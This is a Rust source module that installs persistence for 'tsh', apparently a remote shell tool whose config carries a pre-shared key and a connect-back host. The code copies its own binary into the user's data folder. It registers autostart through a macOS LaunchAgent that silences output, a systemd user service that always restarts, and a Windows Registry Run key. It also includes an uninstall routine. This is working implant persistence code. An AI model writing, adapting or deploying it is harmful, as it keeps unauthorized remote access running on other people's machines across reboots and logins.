use crate::error::*;
use log::info;
use serde::{Deserialize, Serialize};
use std::fs;
use std::path::{Path, PathBuf};

/// Configuration stored on disk for persistence (chmod 600)
#[derive(Debug, Serialize, Deserialize)]
pub struct PersistConfig {
    pub psk: String,
    pub port: u16,
    pub connect_back_host: Option<String>,
    pub delay: u64,
}

/// Install persistence: copy binary + write config + register autostart
pub fn install(config: &PersistConfig) -> TshResult<()> {
    let install_dir = get_install_dir()?;
    fs::create_dir_all(&install_dir)
        .map_err(|e| TshError::system(format!("Failed to create install dir: {e}")))?;

    // Copy current binary to install location
    let binary_dest = install_dir.join(binary_name());
    let current_exe = std::env::current_exe()
        .map_err(|e| TshError::system(format!("Failed to get current exe path: {e}")))?;
    fs::copy(&current_exe, &binary_dest)
        .map_err(|e| TshError::system(format!("Failed to copy binary: {e}")))?;
    info!("Binary installed to {}", binary_dest.display());

    // Set binary executable permission (unix)
    #[cfg(unix)]
    set_executable(&binary_dest)?;

    // Write config file (contains PSK, chmod 600)
    let config_path = install_dir.join("config.json");
    let config_json = serde_json::to_string_pretty(config)
        .map_err(|e| TshError::system(format!("Failed to serialize config: {e}")))?;
    fs::write(&config_path, &config_json)
        .map_err(|e| TshError::system(format!("Failed to write config: {e}")))?;

    #[cfg(unix)]
    set_owner_only_permissions(&config_path)?;

    info!("Config written to {}", config_path.display());

    // Register platform-specific autostart
    register_autostart(&binary_dest, &config_path)?;

    println!("Persistence installed successfully");
    println!("  Binary : {}", binary_dest.display());
    println!("  Config : {}", config_path.display());

    Ok(())
}

/// Remove persistence: unregister autostart + delete installed files
pub fn uninstall() -> TshResult<()> {
    unregister_autostart()?;

    let install_dir = get_install_dir()?;
    if install_dir.exists() {
        fs::remove_dir_all(&install_dir)
            .map_err(|e| TshError::system(format!("Failed to remove install dir: {e}")))?;
        info!("Removed install directory: {}", install_dir.display());
    }

    println!("Persistence removed successfully");
    Ok(())
}

// --- Platform-specific paths ---

fn get_install_dir() -> TshResult<PathBuf> {
    let home = home_dir()?;

    #[cfg(target_os = "macos")]
    let dir = home.join(".config").join("tsh");

    #[cfg(target_os = "linux")]
    let dir = home.join(".local").join("share").join("tsh");

    #[cfg(target_os = "windows")]
    let dir = home.join("AppData").join("Local").join("tsh");

    #[cfg(not(any(target_os = "macos", target_os = "linux", target_os = "windows")))]
    let dir = home.join(".tsh");

    Ok(dir)
}

fn home_dir() -> TshResult<PathBuf> {
    #[cfg(unix)]
    let key = "HOME";
    #[cfg(windows)]
    let key = "USERPROFILE";

    std::env::var(key)
        .map(PathBuf::from)
        .map_err(|_| TshError::system("Could not determine home directory"))
}

fn binary_name() -> &'static str {
    #[cfg(unix)]
    {
        "tsh"
    }
    #[cfg(windows)]
    {
        "tsh.exe"
    }
}

// --- Unix permissions ---

#[cfg(unix)]
fn set_executable(path: &Path) -> TshResult<()> {
    use std::os::unix::fs::PermissionsExt;
    fs::set_permissions(path, fs::Permissions::from_mode(0o755))
        .map_err(|e| TshError::system(format!("Failed to set executable permission: {e}")))
}

#[cfg(unix)]
fn set_owner_only_permissions(path: &Path) -> TshResult<()> {
    use std::os::unix::fs::PermissionsExt;
    fs::set_permissions(path, fs::Permissions::from_mode(0o600))
        .map_err(|e| TshError::system(format!("Failed to set file permissions: {e}")))
}

// --- macOS: LaunchAgent ---

#[cfg(target_os = "macos")]
fn get_launchagent_path() -> TshResult<PathBuf> {
    let home = home_dir()?;
    Ok(home
        .join("Library")
        .join("LaunchAgents")
        .join("com.user.tsh.plist"))
}

#[cfg(target_os = "macos")]
fn register_autostart(binary_path: &Path, config_path: &Path) -> TshResult<()> {
    let plist_path = get_launchagent_path()?;

    // Ensure LaunchAgents directory exists
    if let Some(parent) = plist_path.parent() {
        fs::create_dir_all(parent)
            .map_err(|e| TshError::system(format!("Failed to create LaunchAgents dir: {e}")))?;
    }

    let plist_content = format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.user.tsh</string>
    <key>ProgramArguments</key>
    <array>
        <string>{binary}</string>
        <string>server</string>
        <string>--config</string>
        <string>{config}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>"#,
        binary = binary_path.display(),
        config = config_path.display(),
    );

    fs::write(&plist_path, plist_content)
        .map_err(|e| TshError::system(format!("Failed to write plist: {e}")))?;
    info!("LaunchAgent installed: {}", plist_path.display());

    Ok(())
}

#[cfg(target_os = "macos")]
fn unregister_autostart() -> TshResult<()> {
    let plist_path = get_launchagent_path()?;
    if plist_path.exists() {
        // Unload first (ignore errors if not loaded)
        let _ = std::process::Command::new("launchctl")
            .args(["unload", &plist_path.to_string_lossy()])
            .output();
        fs::remove_file(&plist_path)
            .map_err(|e| TshError::system(format!("Failed to remove plist: {e}")))?;
        info!("LaunchAgent removed: {}", plist_path.display());
    }
    Ok(())
}

// --- Linux: systemd user service ---

#[cfg(target_os = "linux")]
fn get_service_path() -> TshResult<PathBuf> {
    let home = home_dir()?;
    Ok(home
        .join(".config")
        .join("systemd")
        .join("user")
        .join("tsh.service"))
}

#[cfg(target_os = "linux")]
fn register_autostart(binary_path: &Path, config_path: &Path) -> TshResult<()> {
    let service_path = get_service_path()?;

    if let Some(parent) = service_path.parent() {
        fs::create_dir_all(parent)
            .map_err(|e| TshError::system(format!("Failed to create systemd dir: {e}")))?;
    }

    let service_content = format!(
        r#"[Unit]
Description=tsh
After=network.target

[Service]
Type=simple
ExecStart={binary} server --config {config}
Restart=always
RestartSec=10

[Install]
WantedBy=default.target
"#,
        binary = binary_path.display(),
        config = config_path.display(),
    );

    fs::write(&service_path, service_content)
        .map_err(|e| TshError::system(format!("Failed to write service file: {e}")))?;
    info!("systemd service installed: {}", service_path.display());

    // Enable the service (ignore errors — systemd may not be running)
    let _ = std::process::Command::new("systemctl")
        .args(["--user", "enable", "tsh.service"])
        .output();

    Ok(())
}

#[cfg(target_os = "linux")]
fn unregister_autostart() -> TshResult<()> {
    let service_path = get_service_path()?;
    if service_path.exists() {
        let _ = std::process::Command::new("systemctl")
            .args(["--user", "disable", "tsh.service"])
            .output();
        let _ = std::process::Command::new("systemctl")
            .args(["--user", "stop", "tsh.service"])
            .output();
        fs::remove_file(&service_path)
            .map_err(|e| TshError::system(format!("Failed to remove service file: {e}")))?;
        info!("systemd service removed: {}", service_path.display());
    }
    Ok(())
}

// --- Windows: Registry Run key ---

#[cfg(target_os = "windows")]
fn register_autostart(binary_path: &Path, config_path: &Path) -> TshResult<()> {
    let command = format!(
        "\"{}\" server --config \"{}\"",
        binary_path.display(),
        config_path.display()
    );

    let output = std::process::Command::new("reg")
        .args([
            "add",
            r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
            "/v",
            "tsh",
            "/t",
            "REG_SZ",
            "/d",
            &command,
            "/f",
        ])
        .output()
        .map_err(|e| TshError::system(format!("Failed to write registry: {e}")))?;

    if !output.status.success() {
        return Err(TshError::system(format!(
            "Registry write failed: {}",
            String::from_utf8_lossy(&output.stderr)
        )));
    }

    info!("Registry Run key added");
    Ok(())
}

#[cfg(target_os = "windows")]
fn unregister_autostart() -> TshResult<()> {
    let _ = std::process::Command::new("reg")
        .args([
            "delete",
            r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
            "/v",
            "tsh",
            "/f",
        ])
        .output();
    info!("Registry Run key removed");
    Ok(())
}

// --- Fallback for unsupported platforms ---

#[cfg(not(any(target_os = "macos", target_os = "linux", target_os = "windows")))]
fn register_autostart(_binary_path: &PathBuf, _config_path: &PathBuf) -> TshResult<()> {
    Err(TshError::system(
        "Persistence not supported on this platform",
    ))
}

#[cfg(not(any(target_os = "macos", target_os = "linux", target_os = "windows")))]
fn unregister_autostart() -> TshResult<()> {
    Err(TshError::system(
        "Persistence not supported on this platform",
    ))
}

/// Load PersistConfig from a config file path
pub fn load_config(path: &str) -> TshResult<PersistConfig> {
    let content = fs::read_to_string(path)
        .map_err(|e| TshError::system(format!("Failed to read config file: {e}")))?;
    serde_json::from_str(&content)
        .map_err(|e| TshError::system(format!("Failed to parse config: {e}")))
}
